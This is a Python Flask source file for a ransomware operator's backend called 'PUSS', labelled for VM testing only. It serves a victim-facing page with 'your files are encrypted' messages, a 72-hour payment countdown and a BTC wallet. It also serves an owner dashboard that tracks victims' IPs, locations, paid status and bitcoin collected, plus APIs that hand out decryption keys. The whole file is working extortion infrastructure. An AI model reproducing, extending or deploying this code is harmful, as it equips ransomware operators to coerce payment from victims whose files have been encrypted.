#!/usr/bin/env python3
"""
PUSS RANSOMWARE PORTAL - Complete Backend with All Templates
FOR VM TESTING ONLY
"""

import os
import sys
import json
import time
import random
import hashlib
import threading
import socket
import uuid
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, session, render_template_string, redirect, url_for, flash
from flask_cors import CORS
from functools import wraps

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'puss_vm_test_key_40671Mps19*')
CORS(app)

# ============================================================================
# CONFIGURATION FROM ENVIRONMENT VARIABLES
# ============================================================================

class Config:
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
    BTC_WALLET = os.environ.get('BTC_WALLET')
    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT')
    SERVER_URL = os.environ.get('SERVER_URL')

# ============================================================================
# DATA STORAGE
# ============================================================================

class PussDatabase:
    def __init__(self, db_file="puss_victims.json"):
        self.db_file = db_file
        self.victims = {}
        self.owner_password = Config.OWNER_PASSWORD
        self.load()
    
    def load(self):
        try:
            if os.path.exists(self.db_file):
                with open(self.db_file, 'r') as f:
                    data = json.load(f)
                    self.victims = data.get('victims', {})
        except:
            self.victims = {}
    
    def save(self):
        with open(self.db_file, 'w') as f:
            json.dump({'victims': self.victims}, f, indent=2)
    
    def add_victim(self, victim_id, files_count, hostname=None, ip=None, country=None, city=None, lat=None, lon=None):
        self.victims[victim_id] = {
            'id': victim_id,
            'files_encrypted': files_count,
            'ransom': Config.RANSOM_AMOUNT,
            'wallet': Config.BTC_WALLET,
            'status': 'unpaid',
            'payment_deadline': (datetime.now() + timedelta(hours=72)).isoformat(),
            'created_at': datetime.now().isoformat(),
            'decryption_key': self.generate_key(),
            'hostname': hostname or 'UNKNOWN',
            'ip': ip or '0.0.0.0',
            'country': country or 'Unknown',
            'city': city or 'Unknown',
            'lat': lat or 0,
            'lon': lon or 0,
            'paid_at': None,
            'payment_tx': None
        }
        self.save()
        return self.victims[victim_id]
    
    def generate_key(self):
        from cryptography.fernet import Fernet
        return Fernet.generate_key().decode()
    
    def get_victim(self, victim_id):
        return self.victims.get(victim_id.upper())
    
    def verify_payment(self, victim_id, tx_id):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            self.victims[victim_id]['status'] = 'paid'
            self.victims[victim_id]['payment_tx'] = tx_id
            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
            self.save()
            return True
        return False
    
    def update_victim_files(self, victim_id, files_count):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            self.victims[victim_id]['files_encrypted'] = files_count
            self.save()
            return True
        return False
    
    def get_all_victims(self):
        return self.victims
    
    def get_stats(self):
        total = len(self.victims)
        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
        unpaid = total - paid
        try:
            amount = float(Config.RANSOM_AMOUNT.split()[0])
            total_btc = paid * amount
        except:
            total_btc = paid * 0.5
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'total_btc': total_btc,
            'paid_btc': f"{total_btc:.2f}",
            'admin_email': Config.ADMIN_EMAIL
        }
    
    def delete_victim(self, victim_id):
        victim_id = victim_id.upper()
        if victim_id in self.victims:
            del self.victims[victim_id]
            self.save()
            return True
        return False

db = PussDatabase()

# ============================================================================
# LOGIN REQUIRED DECORATOR
# ============================================================================

def owner_login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('owner_logged_in'):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

# ============================================================================
# HTML TEMPLATES (EMBEDDED)
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐱 PUSS DECRYPT PORTAL 🐱</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0000;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            color: #ff3333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .header {
            text-align: center;
            padding: 40px 0;
            border-bottom: 2px solid #ff0000;
            margin-bottom: 40px;
        }
        h1 {
            font-size: 48px;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
            margin-bottom: 10px;
        }
        .subtitle {
            font-size: 18px;
            color: #ff6666;
        }
        .warning-box {
            background: #1a0000;
            border: 2px solid #ff0000;
            padding: 30px;
            margin-bottom: 30px;
            border-radius: 10px;
        }
        .warning-title {
            font-size: 24px;
            color: #ff0000;
            margin-bottom: 20px;
            text-align: center;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #ff9999;
            margin-bottom: 5px;
            font-size: 14px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            background: #2a0000;
            border: 1px solid #ff0000;
            color: #ff3333;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            border-radius: 5px;
        }
        button {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
        }
        button:hover {
            background: #ff6666;
            box-shadow: 0 0 20px #ff0000;
        }
        .links {
            text-align: center;
            margin-top: 20px;
        }
        .links a {
            color: #ff6666;
            text-decoration: none;
            font-size: 14px;
        }
        .stats {
            margin-top: 40px;
            padding: 20px;
            background: #1a0000;
            border: 1px solid #330000;
            border-radius: 5px;
            color: #ff9999;
            font-size: 12px;
            text-align: center;
        }
        .blood-drip {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: repeating-linear-gradient(
                180deg,
                transparent,
                transparent 30px,
                rgba(255,0,0,0.1) 31px,
                transparent 32px
            );
            animation: drip 10s linear infinite;
        }
        @keyframes drip {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .map-link {
            color: #ff6666;
            font-size: 10px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="blood-drip"></div>
    <div class="container">
        <div class="header">
            <h1>🐱 PUSS DECRYPT 🐱</h1>
            <div class="subtitle">Victim Decryption Portal</div>
        </div>
        
        <div class="warning-box">
            <div class="warning-title">⚠️ YOUR FILES ARE ENCRYPTED ⚠️</div>
            <div style="color: #ff9999; margin-bottom: 20px; line-height: 1.6;">
                Your personal files have been encrypted with AES-256. 
                To recover your files, you must pay the ransom and use the decryption key.
            </div>
            
            <form action="/api/login" method="POST" onsubmit="event.preventDefault(); login();">
                <div class="input-group">
                    <label>ENTER YOUR VICTIM ID</label>
                    <input type="text" id="victim_id" placeholder="e.g., VICTIM123" required>
                </div>
                <button type="submit">🔑 ACCESS PORTAL</button>
            </form>
            
            <div class="links">
                <a href="#" onclick="showOwnerLogin()">Owner Login →</a>
            </div>
        </div>
        
        <div class="stats" id="stats">
            Loading stats...
        </div>
    </div>

    <script>
        async function login() {
            const victim_id = document.getElementById('victim_id').value;
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({victim_id: victim_id})
            });
            const data = await response.json();
            if (data.success) {
                window.location.href = '/victim/' + victim_id;
            } else {
                alert('Invalid Victim ID');
            }
        }

        async function loadStats() {
            const response = await fetch('/api/stats');
            const stats = await response.json();
            document.getElementById('stats').innerHTML = 
                `Total Victims: ${stats.total} | Paid: ${stats.paid} | Unpaid: ${stats.unpaid} | Total BTC: ${stats.paid_btc}<br>Contact: ${stats.admin_email}`;
        }

        function showOwnerLogin() {
            document.body.innerHTML = `
                <div style="background:#0a0000; min-height:100vh; display:flex; justify-content:center; align-items:center;">
                    <div style="background:#1a0000; border:2px solid #ff0000; border-radius:10px; padding:40px; width:400px;">
                        <h2 style="color:#ff0000; text-align:center; margin-bottom:30px;">👑 OWNER LOGIN</h2>
                        <div style="margin-bottom:20px;">
                            <label style="color:#ff9999;">MASTER PASSWORD</label>
                            <input type="password" id="owner_pass" style="width:100%; padding:12px; background:#2a0000; border:1px solid #ff0000; color:#ff3333;">
                        </div>
                        <button onclick="ownerLogin()" style="background:#ff0000; color:#000; border:none; padding:15px; width:100%; font-weight:bold; cursor:pointer;">🔓 LOGIN</button>
                        <div style="text-align:center; margin-top:20px;">
                            <a href="/" style="color:#ff6666;">← Back</a>
                        </div>
                    </div>
                </div>
            `;
        }

        async function ownerLogin() {
            const password = document.getElementById('owner_pass').value;
            const response = await fetch('/api/owner/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: password})
            });
            const data = await response.json();
            if (data.success) {
                window.location.href = '/owner/dashboard';
            } else {
                alert('Invalid password');
            }
        }

        loadStats();
        setInterval(loadStats, 5000);
    </script>
</body>
</html>
"""

VICTIM_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victim Dashboard - {{ victim_id }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0000;
            font-family: 'Courier New', monospace;
            color: #ff3333;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .victim-id {
            font-size: 12px;
            color: #ff9999;
        }
        .timer-container {
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .timer-title {
            font-size: 18px;
            color: #ff6666;
            margin-bottom: 10px;
        }
        .timer-bar {
            width: 100%;
            height: 30px;
            background: #2a0000;
            border: 1px solid #ff0000;
            border-radius: 5px;
            position: relative;
            overflow: hidden;
            margin-bottom: 10px;
        }
        .timer-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6666);
            width: 0%;
            transition: width 0.3s;
        }
        .timer-text {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #ff0000;
        }
        .info-box {
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid #330000;
        }
        .info-label {
            color: #ff9999;
        }
        .info-value {
            color: #ff3333;
            font-weight: bold;
        }
        .payment-box {
            background: #1a0000;
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 30px;
            text-align: center;
        }
        .wallet-address {
            background: #2a0000;
            padding: 15px;
            border: 1px dashed #ff0000;
            color: #ff6666;
            font-family: monospace;
            font-size: 14px;
            margin: 20px 0;
            word-break: break-all;
        }
        .status-paid {
            background: #003300;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        .decryption-key {
            background: #003300;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 20px;
            font-family: monospace;
            font-size: 18px;
            margin: 20px 0;
            word-break: break-all;
        }
        .button {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            background: #2a0000;
            border: 1px solid #ff0000;
            color: #ff3333;
            font-family: monospace;
            margin: 10px 0;
        }
        .map-link {
            color: #66ccff;
            font-size: 10px;
            text-align: center;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>🐱 PUSS DECRYPT</div>
            <div class="victim-id">VICTIM ID: <span id="victim_id">{{ victim_id }}</span></div>
        </div>
        
        <div id="content"></div>
    </div>

    <script>
        const victim_id = document.getElementById('victim_id').innerText;
        
        async function loadVictim() {
            const response = await fetch('/api/victim/' + victim_id);
            const victim = await response.json();
            
            if (victim.status === 'paid') {
                document.getElementById('content').innerHTML = `
                    <div class="status-paid">
                        <div style="font-size: 24px; margin-bottom: 10px;">✅ PAYMENT VERIFIED</div>
                        <div style="margin-bottom: 20px;">Your files can now be decrypted</div>
                        <div class="decryption-key">${victim.decryption_key}</div>
                        <div style="color: #00ff00; font-size: 12px;">Use this key with the PUSS Decryptor tool</div>
                    </div>
                `;
            } else {
                const deadline = new Date(victim.payment_deadline);
                const now = new Date();
                const timeLeft = deadline - now;
                const hours = Math.floor(timeLeft / (1000 * 60 * 60));
                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
                const percentage = Math.min(100, Math.max(0, 100 - (timeLeft / (72 * 60 * 60 * 1000) * 100)));
                
                let locationHtml = '';
                if (victim.lat && victim.lon && victim.lat !== 0) {
                    locationHtml = `
                        <div class="info-row">
                            <span class="info-label">Location:</span>
                            <span class="info-value">${victim.city}, ${victim.country}</span>
                        </div>
                        <div class="map-link">
                            <a href="https://www.google.com/maps?q=${victim.lat},${victim.lon}" target="_blank">📍 View on map</a>
                        </div>
                    `;
                }
                
                document.getElementById('content').innerHTML = `
                    <div class="timer-container">
                        <div class="timer-title">⏰ PAYMENT DEADLINE</div>
                        <div class="timer-bar">
                            <div class="timer-fill" style="width: ${percentage}%"></div>
                        </div>
                        <div class="timer-text">${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}</div>
                    </div>
                    
                    <div class="info-box">
                        <div class="info-row">
                            <span class="info-label">Files Encrypted:</span>
                            <span class="info-value">${victim.files_encrypted}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Ransom Amount:</span>
                            <span class="info-value">${victim.ransom}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Status:</span>
                            <span class="info-value" style="color: #ff0000;">UNPAID</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">IP Address:</span>
                            <span class="info-value">${victim.ip}</span>
                        </div>
                        ${locationHtml}
                        <div class="info-row">
                            <span class="info-label">Created:</span>
                            <span class="info-value">${victim.created_at.slice(0,10)}</span>
                        </div>
                    </div>
                    
                    <div class="payment-box">
                        <div style="font-size: 20px; margin-bottom: 10px;">💸 SEND PAYMENT</div>
                        <div style="color: #ff9999; margin-bottom: 10px;">Send exactly ${victim.ransom} to:</div>
                        <div class="wallet-address">${victim.wallet}</div>
                        <div style="color: #ff6666; margin: 20px 0; font-size: 12px;">After payment, enter your transaction ID below</div>
                        <input type="text" id="tx_id" placeholder="Enter Transaction ID">
                        <button class="button" onclick="verifyPayment()">✅ VERIFY PAYMENT</button>
                    </div>
                `;
            }
        }

        async function verifyPayment() {
            const tx_id = document.getElementById('tx_id').value;
            const response = await fetch('/api/verify-payment', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({victim_id: victim_id, tx_id: tx_id})
            });
            const data = await response.json();
            if (data.success) {
                alert('Payment verified! Your decryption key is now available.');
                loadVictim();
            } else {
                alert('Invalid transaction ID');
            }
        }

        loadVictim();
        setInterval(loadVictim, 10000);
    </script>
</body>
</html>
"""

OWNER_DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Owner Dashboard - PUSS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0000;
            font-family: 'Courier New', monospace;
            color: #ff3333;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }
        .stat-value {
            font-size: 36px;
            font-weight: bold;
            color: #ff0000;
            margin-bottom: 5px;
        }
        .stat-label {
            color: #ff9999;
            font-size: 12px;
        }
        .victims-table {
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            overflow-x: auto;
        }
        .table-header {
            display: grid;
            grid-template-columns: 0.8fr 0.8fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 0.8fr;
            background: #330000;
            padding: 15px;
            font-weight: bold;
            color: #ff6666;
            min-width: 1200px;
        }
        .victim-row {
            display: grid;
            grid-template-columns: 0.8fr 0.8fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 0.8fr;
            padding: 15px;
            border-bottom: 1px solid #330000;
            min-width: 1200px;
        }
        .victim-row:hover {
            background: #2a0000;
        }
        .status-badge {
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
        }
        .status-paid {
            background: #003300;
            color: #00ff00;
        }
        .status-unpaid {
            background: #330000;
            color: #ff6666;
        }
        .logout-btn {
            background: #330000;
            color: #ff6666;
            border: 1px solid #ff0000;
            padding: 8px 15px;
            text-decoration: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }
        .add-form {
            background: #1a0000;
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .add-form input {
            background: #2a0000;
            border: 1px solid #ff0000;
            color: #ff3333;
            padding: 8px;
            margin: 5px;
            font-family: monospace;
        }
        .add-form button {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
        }
        .map-link {
            color: #66ccff;
            font-size: 10px;
            text-decoration: none;
        }
        .delete-btn {
            background: #660000;
            color: #ff6666;
            border: none;
            padding: 3px 8px;
            cursor: pointer;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="font-size: 24px;">👑 OWNER DASHBOARD</div>
            <div>
                <span style="color: #ff9999; margin-right: 20px;" id="datetime"></span>
                <button class="logout-btn" onclick="logout()">LOGOUT</button>
            </div>
        </div>
        
        <div class="stats-grid" id="stats"></div>
        
        <div class="add-form">
            <h3 style="color: #ff6666; margin-bottom: 10px;">➕ ADD VICTIM (TESTING)</h3>
            <input type="text" id="new_id" placeholder="Victim ID">
            <input type="number" id="new_files" placeholder="Files Count" value="1000">
            <input type="text" id="new_host" placeholder="Hostname">
            <input type="text" id="new_country" placeholder="Country">
            <input type="text" id="new_city" placeholder="City">
            <button onclick="addVictim()">ADD</button>
        </div>
        
        <div class="victims-table">
            <div class="table-header">
                <div>ID</div>
                <div>FILES</div>
                <div>HOSTNAME</div>
                <div>IP</div>
                <div>COUNTRY</div>
                <div>CITY</div>
                <div>DEADLINE</div>
                <div>STATUS</div>
                <div>MAP</div>
                <div>ACTION</div>
            </div>
            <div id="victims-list"></div>
        </div>
    </div>

    <script>
        async function loadDashboard() {
            const [statsRes, victimsRes] = await Promise.all([
                fetch('/api/stats'),
                fetch('/api/victims')
            ]);
            
            const stats = await statsRes.json();
            const victims = await victimsRes.json();
            
            document.getElementById('datetime').innerText = new Date().toLocaleString();
            
            document.getElementById('stats').innerHTML = `
                <div class="stat-card">
                    <div class="stat-value">${stats.total}</div>
                    <div class="stat-label">TOTAL VICTIMS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${stats.paid}</div>
                    <div class="stat-label">PAID</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${stats.unpaid}</div>
                    <div class="stat-label">UNPAID</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${stats.paid_btc}</div>
                    <div class="stat-label">BTC COLLECTED</div>
                </div>
            `;
            
            let html = '';
            for (const [id, victim] of Object.entries(victims)) {
                const mapLink = (victim.lat && victim.lon && victim.lat !== 0) 
                    ? `<a href="https://www.google.com/maps?q=${victim.lat},${victim.lon}" target="_blank" class="map-link">📍 Map</a>`
                    : 'N/A';
                
                html += `
                    <div class="victim-row">
                        <div>${id}</div>
                        <div>${victim.files_encrypted}</div>
                        <div>${victim.hostname}</div>
                        <div>${victim.ip}</div>
                        <div>${victim.country || 'Unknown'}</div>
                        <div>${victim.city || 'Unknown'}</div>
                        <div>${victim.payment_deadline.slice(0,10)}</div>
                        <div>
                            <span class="status-badge ${victim.status === 'paid' ? 'status-paid' : 'status-unpaid'}">
                                ${victim.status.toUpperCase()}
                            </span>
                        </div>
                        <div>${mapLink}</div>
                        <div>
                            <button class="delete-btn" onclick="deleteVictim('${id}')">DELETE</button>
                        </div>
                    </div>
                `;
            }
            document.getElementById('victims-list').innerHTML = html;
        }

        async function addVictim() {
            const id = document.getElementById('new_id').value;
            const files = document.getElementById('new_files').value;
            const host = document.getElementById('new_host').value;
            const country = document.getElementById('new_country').value;
            const city = document.getElementById('new_city').value;
            
            if (!id) {
                alert('Enter Victim ID');
                return;
            }
            
            await fetch('/api/add-victim', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: id,
                    files: parseInt(files),
                    hostname: host,
                    country: country,
                    city: city
                })
            });
            
            document.getElementById('new_id').value = '';
            document.getElementById('new_host').value = '';
            document.getElementById('new_country').value = '';
            document.getElementById('new_city').value = '';
            loadDashboard();
        }

        async function deleteVictim(id) {
            if (confirm('Delete victim ' + id + '?')) {
                await fetch('/api/delete-victim/' + id, {method: 'DELETE'});
                loadDashboard();
            }
        }

        function logout() {
            fetch('/api/owner/logout').then(() => {
                window.location.href = '/';
            });
        }

        loadDashboard();
        setInterval(loadDashboard, 5000);
    </script>
</body>
</html>
"""

# ============================================================================
# API ROUTES
# ============================================================================

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/victim/<victim_id>')
def victim_page(victim_id):
    victim = db.get_victim(victim_id)
    if not victim:
        return redirect('/')
    return render_template_string(VICTIM_HTML, victim_id=victim_id)

@app.route('/owner/dashboard')
def owner_dashboard():
    return render_template_string(OWNER_DASHBOARD_HTML)

# API Endpoints
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    victim = db.get_victim(victim_id)
    return jsonify({'success': bool(victim)})

@app.route('/api/victim/<victim_id>')
def api_get_victim(victim_id):
    victim = db.get_victim(victim_id)
    return jsonify(victim if victim else {})

@app.route('/api/verify-payment', methods=['POST'])
def api_verify_payment():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    tx_id = data.get('tx_id', '')
    success = db.verify_payment(victim_id, tx_id)
    return jsonify({'success': success})

@app.route('/api/owner/login', methods=['POST'])
def api_owner_login():
    data = request.json
    password = data.get('password', '')
    if password == db.owner_password:
        session['owner_logged_in'] = True
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/api/owner/logout')
def api_owner_logout():
    session.pop('owner_logged_in', None)
    return jsonify({'success': True})

@app.route('/api/stats')
def api_stats():
    return jsonify(db.get_stats())

@app.route('/api/victims')
def api_victims():
    return jsonify(db.get_all_victims())

@app.route('/api/add-victim', methods=['POST'])
def api_add_victim():
    data = request.json
    victim_id = data.get('victim_id', f"VM{random.randint(1000,9999)}").upper()
    files = data.get('files', random.randint(100, 9999))
    hostname = data.get('hostname', socket.gethostname())
    country = data.get('country', 'Unknown')
    city = data.get('city', 'Unknown')
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    ip = data.get('ip', request.remote_addr)
    
    victim = db.add_victim(victim_id, files, hostname, ip, country, city, lat, lon)
    return jsonify(victim)

@app.route('/api/update-victim', methods=['POST'])
def api_update_victim():
    data = request.json
    victim_id = data.get('victim_id', '').upper()
    files = data.get('files_encrypted', 0)
    success = db.update_victim_files(victim_id, files)
    return jsonify({'success': success})

@app.route('/api/delete-victim/<victim_id>', methods=['DELETE'])
def api_delete_victim(victim_id):
    victim_id = victim_id.upper()
    success = db.delete_victim(victim_id)
    return jsonify({'success': success})

# ============================================================================
# UNIVERSAL CONTROL PANEL INTEGRATION
# ============================================================================

# Try to import universal control
try:
    from universal_control import Tool, Param
    HAS_CONTROL = True
except ImportError:
    HAS_CONTROL = False

if HAS_CONTROL:
    class PussPortalTool(Tool):
        name = "PUSS Ransomware Portal"
        description = "Tor-style ransomware payment portal"
        version = "1.0.0"
        
        port = Param.Integer(default=5000, min=1, max=65535, description="Port to run on")
        debug = Param.Boolean(default=False, description="Debug mode")
        
        def execute(self):
            self.log_info(f"Starting PUSS Portal on port {self.port}")
            
            def run_flask():
                app.run(host='0.0.0.0', port=self.port, debug=self.debug)
            
            thread = threading.Thread(target=run_flask)
            thread.daemon = True
            thread.start()
            
            while self.is_running():
                time.sleep(1)
            
            return True

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("🐱  PUSS RANSOMWARE PORTAL 🐱")
    print("=" * 60)
    print(f"Owner Password: {Config.OWNER_PASSWORD}")
    print(f"Admin Email: {Config.ADMIN_EMAIL}")
    print(f"BTC Wallet: {Config.BTC_WALLET}")
    print(f"Ransom Amount: {Config.RANSOM_AMOUNT}")
    print("=" * 60)
    print(f"Server URL: {Config.SERVER_URL}")
    print("=" * 60)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
